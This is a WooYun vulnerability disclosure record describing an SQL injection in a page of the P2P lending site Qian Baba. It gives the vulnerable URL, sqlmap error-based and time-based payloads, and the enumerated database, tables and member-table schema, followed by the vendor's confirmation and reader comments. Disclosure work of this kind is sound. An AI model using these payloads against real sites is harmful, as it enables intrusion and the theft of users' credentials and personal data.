{"id": 73279, "wybug_id": "wooyun-2015-0153827", "wybug_title": "P2P金融安全之钱爸爸sql注入漏洞（66W会员信息泄露）", "wybug_corp": "深圳市钱爸爸电子商务有限公司", "wybug_author": "Nelion", "wybug_date": "2015-11-17 09:43", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： p2p金融钱爸爸（https://www.qian88.com/）存在sql注入漏洞。 详细说明：  1、注入点：\nhttp://space.qian88.com.cn/space.php?uid=272104&do=wall&view=me\n\nParameter: uid (GET)    Type: error-based    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: uid=272104 AND EXTRACTVALUE(3444,CONCAT(0x5c,0x716b706b71,(SELECT (ELT(3444=3444,1))),0x716a786b71))&do=wall&view=me    Type: AND/OR time-based blind    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)    Payload: uid=272104 AND 2405=BENCHMARK(5000000,MD5(0x567a4850))&do=wall&view=me---[12:50:41] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL 5.1\n   漏洞证明：  2、所有的数据库：\navailable databases [4]:[*] information_schema[*] jituanwang[*] qianbaba[*] test\n3、当前库qianbaba的表（表太多就截些数据多的）：\nDatabase: qianbaba+-----------------------------------+---------+| Table                             | Entries |+-----------------------------------+---------+| pre_home_notification             | 1435411 || pre_home_friend_request           | 813189  || pre_common_credit_rule_log        | 677829  || pre_ucenter_memberfields          | 668498  || pre_ucenter_members               | 668498  || pre_common_member_count           | 655245  || pre_common_member_field_forum     | 655245  || pre_common_member_field_home      | 655245  || pre_common_member_status          | 655245  || pre_common_member_profile         | 655244  || pre_common_member_newprompt       | 655198  || pre_common_member                 | 484364  || pre_strayer_url                   | 259710  || pre_common_onlinetime             | 95170   || pre_strayer_article_content       | 83678   || pre_strayer_article_title         | 83677   || v9_keyword_data                   | 61404   || pre_common_member_action_log      | 55602   || pre_forum_post                    | 52617   || pre_common_district               | 45051   || pre_forum_threadpartake           | 35800   || pre_plugin_autoreply_ref          | 35582   || v9_collection_content             | 34262   || v9_attachment                     | 33169   || v9_attachment_index               | 31146   || v9_hits                           | 28532   || v9_search                         | 28484   || v9_news_data                      | 28027   || v9_news                           | 28003   || uchome_creditlog                  | 26988   || v9_collection_history             | 24793   || pre_forum_attachment              | 19880   || pre_forum_thread                  | 18155   |\n4、表pre_ucenter_members的字段：Database: qianbabaTable: pre_ucenter_members[12 columns]+---------------+-----------------------+| Column        | Type                  |+---------------+-----------------------+| email         | char(32)              || lastloginip   | int(10)               || lastlogintime | int(10) unsigned      || myid          | char(30)              || myidkey       | char(16)              || password      | char(32)              || regdate       | int(10) unsigned      || regip         | char(15)              || salt          | char(6)               || secques       | char(8)               || uid           | mediumint(8) unsigned || username      | char(15)              |+---------------+-----------------------+5、再dump点数据看看：\n\n   修复方案：  参数过滤   版权声明：转载请注明来源 Nelion@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-11-20 16:41 厂商回复： 感谢白帽子Nelion提交的漏洞，已转交技术人员处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-20 17:14 |    \t\t心云 \t\t\t( 普通白帽子  |\t\t\t        Rank:184 漏洞数:57        | Rank:200 漏洞数:55 | Rank:300 漏洞数:70 ...)\t\t \n  ............sql注入只给3 rank也是醉了，影响全站用户数据 @深圳市钱爸爸电子商务有限公司    \n     2015-12-10 20:36 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:285 漏洞数:48        | little red pig!)\t\t \n  ...1毛一条,那也有6.6万    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}